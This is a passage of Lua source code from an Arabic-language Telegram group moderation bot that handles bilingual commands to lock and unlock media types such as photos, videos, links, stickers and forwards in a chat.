                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الدردشه سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "inline" or mutepts[2] == "الاونلاين" then
              if not database:get('bot:inline:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock inline ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الاونلاين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 59, string.len(msg.sender_user_id_))
                end
                database:set('bot:inline:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ inline is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الاونلاين سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "photo" or mutepts[2] == "الصور" then
              if not database:get('bot:photo:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock photo ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الصور • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
                end
                database:set('bot:photo:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ photo is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الصور سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "spam" or mutepts[2] == "الكلايش" then
              if not database:get('bot:spam:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock spam ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الكلايش • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('bot:spam:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ spam is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الكلايش سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "video" or mutepts[2] == "الفيديو" then
              if not database:get('bot:video:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock video ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الفيديو • \n📚⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('bot:video:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ video is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الفيديو سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "gif" or mutepts[2] == "المتحركه" then
              if not database:get('bot:gifs:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock gif ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل المتحركه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 58, string.len(msg.sender_user_id_))
                end
                database:set('bot:gifs:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ gif is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل المتحركه سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "music" or mutepts[2] == "الاغاني" then
              if not database:get('bot:music:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock music ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الاغاني • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('bot:music:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ music is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الاغاني سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "voice" or mutepts[2] == "الصوت" then
              if not database:get('bot:voice:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock voice ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الصوت • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
                end
                database:set('bot:voice:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ voice is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الصوت سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "links" or mutepts[2] == "الروابط" then
              if not database:get('bot:links:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock links ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الروابط • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('bot:links:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ links is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الروابط سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "location" or mutepts[2] == "المواقع" then
              if not database:get('bot:location:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock location ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل المواقع • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('bot:location:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ location is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل المواقع سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "tag" or mutepts[2] == "المعرف" then
              if not database:get('tags:lock'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock tag ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل المعرف • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 56, string.len(msg.sender_user_id_))
                end
                database:set('tags:lock'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ tag is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل المعرف سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "strict" or  mutepts[2] == "الحمايه" then
              if not database:get('bot:strict'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock strict ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الحمايه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('bot:strict'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ strict is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الحمايه سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "file" or mutepts[2] == "الملفات" then
              if not database:get('bot:document:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock file ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الملفات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('bot:document:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ file is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الملفات سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "hashtag" or mutepts[2] == "الهاشتاك" then
              if not database:get('bot:hashtag:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock hashtag ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الهاشتاك • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 58, string.len(msg.sender_user_id_))
                end
                database:set('bot:hashtag:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ hashtag is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الهاشتاك سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "contact" or mutepts[2] == "الجهات" then
              if not database:get('bot:contact:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock contact ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الجهات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 56, string.len(msg.sender_user_id_))
                end
                database:set('bot:contact:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ contact is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الجهات سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "webpage" or mutepts[2] == "الشبكات" then
              if not database:get('bot:webpage:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock webpage ☑️', 1, 'md')
                else
                 local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الشبكات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('bot:webpage:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ webpage is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الشبكات سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "arabic" or mutepts[2] == "العربيه" then
              if not database:get('bot:arabic:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock arabic ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل العربيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('bot:arabic:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ arabic is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل العربيه سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "english" or mutepts[2] == "الانكليزيه" then
              if not database:get('bot:english:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock english ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الانكليزيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 60, string.len(msg.sender_user_id_))
                end
                database:set('bot:english:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ english is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الانكليزيه سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "sticker" or mutepts[2] == "الملصقات" then
              if not database:get('bot:sticker:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock sticker ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الملصقات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 58, string.len(msg.sender_user_id_))
                end
                database:set('bot:sticker:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ sticker is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الملصقات سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "markdown" or mutepts[2] == "الماركداون" then
              if not database:get('markdown:lock'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock markdown ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الماركداون • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 60, string.len(msg.sender_user_id_))
                end
                database:set('markdown:lock'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ markdown is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الماركداون سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "tgservice" or mutepts[2] == "الاشعارات" then
              if not database:get('bot:tgservice:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock tgservice ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الاشعارات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 59, string.len(msg.sender_user_id_))
                end
                database:set('bot:tgservice:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ tgserice is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الاشعارات سابقا ✔️', 1, 'md')
                end
              end
            end
            if mutept[2] == "fwd" or mutepts[2] == "التوجيه" then
              if not database:get('bot:forward:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock fwd ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل التوجيه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('bot:forward:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ fwd is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل التوجيه سابقا ✔️', 1, 'md')
                end
              end
            end
          end
        end
        -------------------------------------faeder----------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Uu]nlock (.*)$") or text:match("^فتح (.*)$") then
            local unmutept = {string.match(text, "^([Uu]nlock) (.*)$")}
            if is_leaderid(msg.sender_user_id_) then
              tar = 'المطور ✨'
            elseif is_sudoid(msg.sender_user_id_) then
              tar = 'المطور ✨'
            elseif is_admin(msg.sender_user_id_) then
              tar = 'المطور ✨'
              elseif is_onall(msg.sender_user_id_) then
              tar = 'المدير ✨'
              elseif is_moall(msg.sender_user_id_) then
              tar = 'الادمن ✨'
              elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
              tar = 'المنشئ ✨'
            elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
              tar = 'المدير ✨'
            elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
              tar = 'الادمن ✨'          
            end
            local unmutepts = {string.match(text, "^(فتح) (.*)$")}
            if unmutept[2] == "all" or unmutepts[2] == "الكل" or unmutepts[2] == "الكل بالساعات" then
              if database:get('bot:muteall'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock all ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح كل الوسائط • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 60, string.len(msg.sender_user_id_))
                end
                database:del('bot:muteall'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ all is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح كل الوسائط سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "text" or unmutepts[2] == "الدردشه" then
              if database:get('bot:text:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock text ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الدردشه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('bot:text:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ text is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الدردشه سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "photo" or unmutepts[2] == "الصور" then
              if database:get('bot:photo:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock photo ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الصور • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 55, string.len(msg.sender_user_id_))
                end
                database:del('bot:photo:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ photo is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الصور سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "spam" or unmutepts[2] == "الكلايش" then
              if database:get('bot:spam:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock spam ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الكلايش • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('bot:spam:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ spam is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الكلايش سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "video" or unmutepts[2] == "الفيديو" then
              if database:get('bot:video:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock video ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الفيديو • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('bot:video:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ video is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الفيديو سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "file" or unmutepts[2] == "الملفات" then
              if database:get('bot:document:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock file ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الملفات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('bot:document:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ file is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الملفات سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "inline" or unmutepts[2] == "الاونلاين" then
              if database:get('bot:inline:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock inline ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الاونلاين • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 59, string.len(msg.sender_user_id_))
                end
                database:del('bot:inline:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ inline is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الاونلاين سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "markdown" or unmutepts[2] == "الماركداون" then
              if database:get('markdown:lock'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock markdown ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الماركداون • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 60, string.len(msg.sender_user_id_))
                end
                database:del('markdown:lock'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ markdown is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الماركداون سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "gif" or unmutepts[2] == "المتحركه" then
              if database:get('bot:gifs:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock gif ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح المتحركه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 58, string.len(msg.sender_user_id_))
                end
                database:del('bot:gifs:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ gif is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح المتحركه سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "music" or unmutepts[2] == "الاغاني" then
              if database:get('bot:music:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock music ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم فتح الاغاني • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:del('bot:music:mute'..msg.chat_id_)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ music is already unlocked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم فتح الاغاني سابقا ✔️', 1, 'md')
                end
              end
            end
            if unmutept[2] == "voice" or unmutepts[2] == "الصوت" then
              if database:get('bot:voice:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been unlock voice ☑️', 1, 'md')
                else
